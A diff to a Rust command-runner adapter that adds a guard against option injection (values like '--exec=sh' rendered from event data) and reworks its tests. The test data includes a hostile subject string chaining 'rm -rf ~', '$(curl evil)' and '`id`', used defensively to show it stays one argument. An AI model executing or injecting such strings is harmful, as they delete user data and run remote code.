@@ -1,9 +1,15 @@
 //! The `command` adapter: runs a configured argv. Each argument template is rendered on its own
 //! (`pulse_core::render_args`), so event content can never add arguments, and nothing goes
 //! through a shell. The program itself cannot contain placeholders (config validation).
+//!
+//! One check on top: an argument whose template *starts* with a placeholder must not render to
+//! something starting with `-` unless an earlier argument is exactly `--`. Otherwise a file
+//! named `--exec=sh` would reach the program as an option. The run fails before spawning, with
+//! a message saying how to fix the template. Values after literal text (`--title={{subject}}`)
+//! are not affected: the option is the user's, the value cannot become another one.
 
 use pulse_contracts::config::{AdapterSettings, AgentConfig, StdinMode};
-use pulse_contracts::template::Template;
+use pulse_contracts::template::{Template, TemplatePart};
 use pulse_contracts::{OutputKind, RunOutput};
 use pulse_core::{RenderInput, render_args};
 
@@ -43,6 +49,19 @@ impl AgentAdapter for CommandAdapter {
         };
         let prompt = req.prompt.as_ref().map(|p| p.text.as_str());
         let args = render_args(&templates, &input, prompt, &req.limits).args;
+        for (i, (template, arg)) in templates.iter().zip(&args).enumerate() {
+            if rest[i] == "--" {
+                break;
+            }
+            if arg.starts_with('-') && matches!(template.parts.first(), Some(TemplatePart::Var(_)))
+            {
+                return Err(AdapterError::Invalid(format!(
+                    "command[{}] ({:?}) rendered to a value starting with '-', which the program could read as an option; put \"--\" before event-derived arguments, or read the event from PULSE_EVENT_FILE",
+                    i + 1,
+                    rest[i]
+                )));
+            }
+        }
         let stdin = match settings.stdin {
             StdinMode::Prompt => prompt.map(str::to_owned),
             StdinMode::Event => Some(
@@ -80,84 +99,76 @@ impl OutputParser for LineParser {
 
 #[cfg(test)]
 mod tests {
-    use std::path::PathBuf;
-
-    use pulse_contracts::config::{CommandSettings, PromptLimits};
-    use pulse_contracts::{Duration, Event, EventId, EventType, RunId, Timestamp, Ulid};
-    use serde_json::json;
+    use pulse_contracts::config::{AgentKind, CommandSettings};
 
     use super::*;
     use crate::adapter_for;
+    use crate::test_support::{HOSTILE, agent, env, request};
 
-    fn request(subject: &str) -> RunRequest {
-        RunRequest {
-            run_id: RunId::from_ulid(Ulid::from_parts(1, 1)),
-            rule: Some("notify".into()),
-            agent: "notify".into(),
-            event: Event {
-                specversion: Default::default(),
-                id: EventId::from_ulid(Ulid::from_parts(2, 2)),
-                type_: EventType::new("fs.file.created").unwrap(),
-                source: "pulse://fs/u".into(),
-                subject: Some(subject.into()),
-                time: Timestamp::from_millis(0),
-                datacontenttype: None,
-                data: json!({"path": subject}),
-                dedupe_key: None,
-                coalesced: None,
-                causation_run: None,
-                causation: None,
-                chain_depth: 0,
-                replay_of: None,
-            },
-            prompt: None,
-            chain_depth: 1,
-            cwd: PathBuf::from("/w"),
-            event_file: PathBuf::from("/p/runs/1/event.json"),
-            pulse_home: PathBuf::from("/p"),
-            limits: PromptLimits::default(),
-        }
-    }
-
-    fn agent(command: &[&str], stdin: StdinMode) -> AgentConfig {
-        AgentConfig {
-            name: "notify".into(),
-            adapter: AdapterSettings::Command(CommandSettings {
-                command: command.iter().map(|s| s.to_string()).collect(),
-                stdin,
-            }),
-            allow: vec![],
-            cwd: None,
-            timeout: Duration::from_mins(1),
-            max_concurrent: 1,
-            max_queued: 1,
-            env: [
-                ("PULSE_RUN_ID".to_owned(), "spoofed".to_owned()),
-                ("TOKEN".to_owned(), "t".to_owned()),
-            ]
-            .into(),
-        }
+    fn command(argv: &[&str], stdin: StdinMode) -> AgentConfig {
+        agent(AdapterSettings::Command(CommandSettings {
+            command: argv.iter().map(|s| s.to_string()).collect(),
+            stdin,
+        }))
     }
 
     #[test]
     fn hostile_subjects_stay_one_argument() {
-        let adapter = adapter_for(pulse_contracts::config::AgentKind::Command).unwrap();
-        let req = request("/u/x; rm -rf ~ && $(curl evil) `id` --exec=sh");
-        let inv = adapter
-            .invocation(&agent(&["notify-send", "--", "{{subject}}"], StdinMode::Event), &req)
-            .unwrap();
-        assert_eq!(inv.program, "notify-send");
-        assert_eq!(inv.args, vec!["--", "/u/x; rm -rf ~ && $(curl evil) `id` --exec=sh"]);
-        assert_eq!(inv.cwd, PathBuf::from("/w"));
-        let get = |k: &str| inv.env.iter().rev().find(|(n, _)| n == k).map(|(_, v)| v.as_str());
-        assert_eq!(
-            get("PULSE_RUN_ID"),
-            Some(req.run_id.to_string().as_str()),
-            "the run env wins over config"
-        );
-        assert_eq!(get("TOKEN"), Some("t"));
-        assert_eq!(get("PULSE_EVENT_FILE"), Some("/p/runs/1/event.json"));
-        assert_eq!(get("PULSE_RULE"), Some("notify"));
-        assert!(inv.stdin.unwrap().contains("\"pulsechaindepth\""));
+        let adapter = adapter_for(AgentKind::Command).unwrap();
+        for subject in HOSTILE {
+            let req = request(subject);
+            let inv = adapter
+                .invocation(
+                    &command(&["notify-send", "--", "{{subject}}", "x{{name}}"], StdinMode::Event),
+                    &req,
+                )
+                .unwrap();
+            assert_eq!(inv.program, "notify-send");
+            assert_eq!(inv.args, vec!["--".to_owned(), subject.to_owned(), format!("x{subject}")]);
+            assert_eq!(inv.cwd, std::path::PathBuf::from("/w"));
+            assert_eq!(
+                env(&inv.env, "PULSE_RUN_ID"),
+                Some(req.run_id.to_string().as_str()),
+                "the run env wins over config"
+            );
+            assert_eq!(env(&inv.env, "TOKEN"), Some("t"));
+            assert_eq!(env(&inv.env, "PULSE_EVENT_FILE"), Some("/p/runs/1/event.json"));
+            assert_eq!(env(&inv.env, "PULSE_RULE"), Some("notify"));
+            assert!(inv.stdin.unwrap().contains("\"pulsechaindepth\""));
+        }
+    }
+
+    #[test]
+    fn option_looking_values_need_a_double_dash() {
+        let adapter = adapter_for(AgentKind::Command).unwrap();
+        let req = request("--exec=sh");
+        // (argv, accepted)
+        let cases: [(&[&str], bool); 5] = [
+            (&["lp", "{{name}}"], false),
+            (&["lp", "-o", "x", "{{subject}}"], false),
+            (&["lp", "--", "{{name}}"], true),
+            (&["lp", "--title={{name}}"], true),
+            (&["lp", "./{{name}}"], true),
+        ];
+        for (argv, accepted) in cases {
+            let result = adapter.invocation(&command(argv, StdinMode::None), &req);
+            assert_eq!(result.is_ok(), accepted, "{argv:?}: {result:?}");
+        }
+        let err =
+            adapter.invocation(&command(&["lp", "{{name}}"], StdinMode::None), &req).unwrap_err();
+        assert!(err.to_string().contains("command[1]"), "{err}");
+    }
+
+    #[test]
+    fn stdin_modes() {
+        let adapter = adapter_for(AgentKind::Command).unwrap();
+        let req = request("/u/a.pdf");
+        let stdin = |mode| adapter.invocation(&command(&["cat"], mode), &req).unwrap().stdin;
+        assert_eq!(stdin(StdinMode::Prompt).as_deref(), Some("Summarize /u/a.pdf"));
+        assert_eq!(stdin(StdinMode::None), None);
+        let mut no_prompt = request("/u/a.pdf");
+        no_prompt.prompt = None;
+        let inv = adapter.invocation(&command(&["cat"], StdinMode::Prompt), &no_prompt).unwrap();
+        assert_eq!(inv.stdin, None);
     }
 }
